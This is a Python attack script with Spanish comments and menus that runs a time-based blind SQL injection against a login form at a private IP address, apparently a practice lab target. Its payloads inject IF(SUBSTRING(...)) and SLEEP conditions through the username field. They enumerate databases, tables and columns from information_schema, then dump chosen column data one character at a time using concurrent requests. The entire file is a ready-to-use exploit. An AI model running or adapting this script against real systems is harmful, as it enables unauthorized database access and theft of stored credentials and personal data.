#!/usr/bin/python3

from pwn import *
import requests, signal, sys, time
from concurrent.futures import ThreadPoolExecutor

def def_handler(sig, frame):
    print("\n\n[!] Saliendo ....\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

url = "http://10.88.0.2/login.php"

characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$-_'

SLEEP_TIME = 1.0
THRESHOLD = 0.8
MAX_WORKERS = 20

def test_char(payload_template, index, position, char):
    payload = payload_template.format(index=index, position=position, char=char)
    data = {'username': payload, 'password': 'irrelevante'}

    session = requests.Session()
    start = time.time()
    session.post(url, data=data)
    end = time.time()
    session.close()

    return (end - start) > THRESHOLD, char

def test_char_direct(payload):
    data = {'username': payload, 'password': 'irrelevante'}

    session = requests.Session()
    start = time.time()
    session.post(url, data=data)
    end = time.time()
    session.close()

    return (end - start) > THRESHOLD

def brute_extract(payload_template, label="EXTRACCIÓN", max_entries=20, max_length=50):
    results = []

    print(f"\n[+] Iniciando extracción de {label}...\n")

    for entry_index in range(max_entries):
        entry_value = ""

        print(f"[+] ", end=' ', flush=True)

        for position in range(1, max_length + 1):
            found = False
            with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
                futures = [executor.submit(test_char, payload_template, entry_index, position, char) for char in characters]
                for future in futures:
                    is_match, char = future.result()
                    if is_match:
                        confirmed, _ = test_char(payload_template, entry_index, position, char)
                        if confirmed:
                            entry_value += char
                            print(char, end='', flush=True)
                            found = True
                            break

            if not found:
                break

        print()  # salto de línea después de cada entrada

        if entry_value:
            results.append(entry_value)
        else:
            break

    return results

def extract_databases():
    template = (
        "' OR IF(SUBSTRING((SELECT schema_name FROM information_schema.schemata "
        "LIMIT {index},1),{position},1)='{char}', SLEEP(" + str(SLEEP_TIME) + "), 0)-- -"
    )
    return brute_extract(template, label="Bases de datos")

def extract_tables(database):
    template = (
        "' OR IF(SUBSTRING((SELECT table_name FROM information_schema.tables "
        "WHERE table_schema='" + database + "' LIMIT {index},1),{position},1)='{char}', SLEEP(" + str(SLEEP_TIME) + "), 0)-- -"
    )
    return brute_extract(template, label=f"Tablas de {database}")

def extract_columns(database, table):
    template = (
        "' OR IF(SUBSTRING((SELECT column_name FROM information_schema.columns "
        "WHERE table_schema='" + database + "' AND table_name='" + table + "' LIMIT {index},1),{position},1)='{char}', SLEEP(" + str(SLEEP_TIME) + "), 0)-- -"
    )
    return brute_extract(template, label=f"Columnas de {table}")

def extract_data(database, table, columns, max_rows=10, max_length=50):
    results = []
    columns_str = ",".join(columns)

    print(f"\n[+] Extrayendo datos de {table} - columnas: {', '.join(columns)}")

    for row_index in range(max_rows):
        row_value = ""
        print(f"\n[+] ", end='', flush=True)

        for position in range(1, max_length + 1):
            found = False

            with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
                futures = []
                for char in characters:
                    payload = (
                        "' OR IF(SUBSTRING(BINARY (SELECT CONCAT_WS('|||'," + columns_str + ") FROM " + database + "." + table + " "  
                        "LIMIT " + str(row_index) + ",1)," + str(position) + ",1)='" + char + "', SLEEP(" + str(SLEEP_TIME) + "), 0)-- -"
                    )
                    futures.append(executor.submit(test_char_direct, payload))

                for i, future in enumerate(futures):
                    if future.result():
                        payload_confirm = (
                            "' OR IF(SUBSTRING(BINARY (SELECT CONCAT_WS('|||'," + columns_str + ") FROM " + database + "." + table + " "
                            "LIMIT " + str(row_index) + ",1)," + str(position) + ",1)='" + characters[i] + "', SLEEP(" + str(SLEEP_TIME) + "), 0)-- -"
                        )
                        if test_char_direct(payload_confirm):
                            row_value += characters[i]
                            print(characters[i], end='', flush=True)
                            found = True
                            break

            if not found:
                break

        if row_value:
            results.append(row_value)
            print()  # salto de línea después de fila completa
        else:
            print("\n[!] No más filas detectadas.")
            break

    return results

def print_data_rows(data_rows, selected_cols_list, hide_password=True):
    print("\n[+] Datos extraidos:")
    for i, row in enumerate(data_rows):
        values = row.split("|||")
        print(f"Fila #{i}:")
        for col, val in zip(selected_cols_list, values):
            if hide_password and col.lower() == "password":
                print(f"  {col}: {'*' * 8}  (oculto)")
            else:
                print(f"  {col}: {val}")

def interactive_menu():
    while True:
        print("\n--- Menú ---")
        print("1) Ver bases de datos")
        print("2) Ver tablas de una base de datos")
        print("3) Ver columnas de una tabla")
        print("4) Dumpear datos de UNA columna")
        print("0) Salir")

        choice = input("\nSelecciona una opción: ").strip()

        if choice == '1':
            dbs = extract_databases()

        elif choice == '2':
            db = input("Ingresa el nombre de la base de datos: ").strip()
            if not db:
                print("[!] No ingresaste base de datos")
                continue
            tbls = extract_tables(db)

        elif choice == '3':
            db = input("Ingresa el nombre de la base de datos: ").strip()
            if not db:
                print("[!] No ingresaste base de datos")
                continue
            tbl = input("Ingresa el nombre de la tabla: ").strip()
            if not tbl:
                print("[!] No ingresaste tabla")
                continue
            cols = extract_columns(db, tbl)

        elif choice == '4':
            db = input("Ingresa el nombre de la base de datos: ").strip()
            if not db:
                print("[!] No ingresaste base de datos")
                continue

            tbl = input("Ingresa el nombre de la tabla: ").strip()
            if not tbl:
                print("[!] No ingresaste tabla")
                continue

            col = input("Ingresa la columna que quieres dumpear: ").strip()
            if not col:
                print("[!] No ingresaste columna")
                continue
            selected_cols_list = [col]

            data_rows = extract_data(db, tbl, selected_cols_list)
            print_data_rows(data_rows, selected_cols_list, hide_password=True)

            print("\n[!] Para dumpear otra columna, debes volver a ingresar base, tabla y columna.")

        elif choice == '0':
            print("Saliendo...")
            sys.exit(0)

        else:
            print("[!] Opción no válida")

def main():
    interactive_menu()

if __name__ == '__main__':
    main()
